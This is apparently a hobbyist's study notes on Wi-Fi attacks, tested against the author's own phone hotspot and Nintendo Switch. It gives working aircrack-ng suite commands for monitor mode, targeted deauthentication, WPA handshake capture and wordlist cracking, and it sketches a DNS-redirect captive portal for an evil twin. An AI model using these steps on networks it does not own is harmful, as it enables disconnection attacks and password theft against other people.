This will be very project based and subject to change constantly.
# Learning Stuff time
## Deauth
Looking at wikipedia, it seems to work in a similar way to a radio jammer. The attack also targets the connection when it is not encrypted so it can work on type of encryption?

This can also be used to force a connection to an evil twin.

## Evil Twin
The one thing I'm confused about is if you need to have the same mac address of the Access point.

From what i can tell you dont need to and the SSID is the only thing that matters. You can also mimic the security settings but it is not needed. The SSID is sent to the AP in the first step of the handshake, the MAC address is also sent. The reason it is sent is so the router can add it to the  association table which says "you have connected before so everything is good." Otherwise it checks the SSID

With the above in mind all you need to do is copy the SSID and block the correct AP and the rest should follow through.

## WPA3 Wifi handshake
Trying to configure the wifi card and wireshark seems like a lot of work, so instead I'm just going to find one online and use that.

I found this repo [link](https://github.com/vanhoefm/wifi-example-captures) Which contains a bunch of pcap files. Looking at the wpa3 pcap file there are 4 EAPOL packets. Which seems to be the handshake! 

## Deauth Attack
Going to be using a Raspberry Pi with a cheap $15 wifi adapter that can be put into monitoring mode.

The goal will be to deauth a device from my hotspot, this is the only thing i have that has wpa3 encryption :( .

### The tech bit.
Listing wireless interfaces on the pi.
```bash
eljay@raspberrypi:~ $ iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:"theholygrail"  
          Mode:Managed  Frequency:5.22 GHz  Access Point: IDK if this is private   
          Bit Rate=24 Mb/s   Tx-Power=31 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=70/70  Signal level=-27 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:221  Invalid misc:0   Missed beacon:0

wg0       no wireless extensions.

wlan1     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=36 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```
The device is the `wlan1` interface. Next is to put it into monitoring mode using airmon-ng.
```bash
sudo airmon-ng start wlan1 
```
Now you can list the ESSID's
```shell
sudo airodump wlan1
```
WIthin the dump is my phone.
```
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
8A:CC:B5:1D:9A:F9  -78        9        0    0   6  130   WPA3 CCMP   SAE  ElJay’s Phone              
```
No i dont call it `ElJay's Phone` I renamed it :)
Next we can do the same thing but target this device by using the BSSID.
(Everytime i check the hotspot the BSSID changes.)

```
sudo airodump-ng -d 2A:C1:ED:94:F8:07 wlan1
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 2A:C1:ED:94:F8:07  -77       14      138    0   6  130   WPA3 CCMP   SAE  <length: 15>                 

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 2A:C1:ED:94:F8:07  58:2F:40:CE:5D:73  -70    0 -24e    53      138    
```
Now that we have the BSSID of both the AP and client we can send a deauth packet.
**Disclaimer: This is the cyber crimes bit. Make sure it is your own network or that you have permission.**
```bash
sudo aireplay-ng  -0 0 -a 2A:C1:ED:94:F8:07 -c 58:2F:40:CE:5D:73 wlan1
```
where `a` is the access point (hotspot) and `c` is the client (Nintendo switch).

## Get and crack a handshake.
Running the scanning tool again and manually connecting to wifi from the switch shows that a WPA handshake has been captured. Further down it shows the AP it has connected to and under notes it says it was EAPOL. How do I save the hash and make hashcat do all the work?

Official aircrack-ng tutorial [link](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)

`-w psk` will save the handshake apparently. Forcing the switch to connect again and ...

(For safety best to `-d` to only get your AP)
```
sudo airodump-ng -c 6 wlan1 -w psk -d A6:99:42:94:34:7F
```

I have a pcap file now! Wireshark time. The file is big and I dont want to deal with that right now.

Cracking it on the RPi (very bad idea) with a questionable wordlist. shows that it works!
```bash
aircrack-ng -w pwd.lst psk*.cap
```

you can also use hashcat but you have to convert the file first [link](https://hashcat.net/cap2hashcat/).

# Looking into how to generate a capture page.
Only useful thing i can find is this [link](https://github.com/jee1mr/captive-portal).

I guess i could try to figure out how to route all traffic to that page. If this was to be used for some form of authentication it would then have a dns server that works but there is no need to do that right now.

So a DNS server will resolve different addresses to different IP's and then do protocol things. What if I make a DNS server that resolves everything to http://localhost/landingpage.php ? 

